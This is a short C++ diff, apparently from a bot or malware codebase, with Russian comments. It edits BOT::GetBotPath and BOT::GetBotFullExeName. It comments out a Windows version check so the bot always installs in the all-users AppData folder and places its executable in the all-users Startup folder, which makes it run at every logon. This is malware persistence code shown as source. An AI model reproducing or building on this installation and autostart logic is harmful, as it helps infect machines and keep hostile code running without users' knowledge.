@@ -627,19 +627,18 @@ string BOT::GetBotPath()
 
 		int CSIDL =  CSIDL_COMMON_APPDATA;
 
-
 		// Временный патч. В Висте и старше получаем папку текущего юзера
-		OSVERSIONINFOEXA OSVersion;
-
-		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
-
-		if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
-		{
-			if ( OSVersion.dwMajorVersion >= 6 )
-			{
-            	CSIDL =  CSIDL_APPDATA;
-            }
-		}
+//		OSVERSIONINFOEXA OSVersion;
+//
+//		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
+//
+//		if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
+//		{
+//			if ( OSVersion.dwMajorVersion >= 6 )
+//			{
+//				CSIDL =  CSIDL_APPDATA;
+//			}
+//		}
 
 
 
@@ -754,7 +753,24 @@ string BOT::GetBotFullExeName()
 {
 	if (BotData->BotExeName.IsEmpty())
 	{
-		BotData->BotExeName = GetSpecialFolderPathA(CSIDL_COMMON_STARTUP, GetBotExeName());
+
+		// Временный патч. В Висте и старше получаем папку текущего юзера
+		int CSIDL = CSIDL_COMMON_STARTUP;
+//
+//		OSVERSIONINFOEXA OSVersion;
+//
+//		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
+//
+//		if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
+//		{
+//			if ( OSVersion.dwMajorVersion >= 6 )
+//			{
+//				CSIDL =  CSIDL_STARTUP;
+//			}
+//		}
+
+
+		BotData->BotExeName = GetSpecialFolderPathA(CSIDL, GetBotExeName());
 	}
     return BotData->BotExeName;
 }
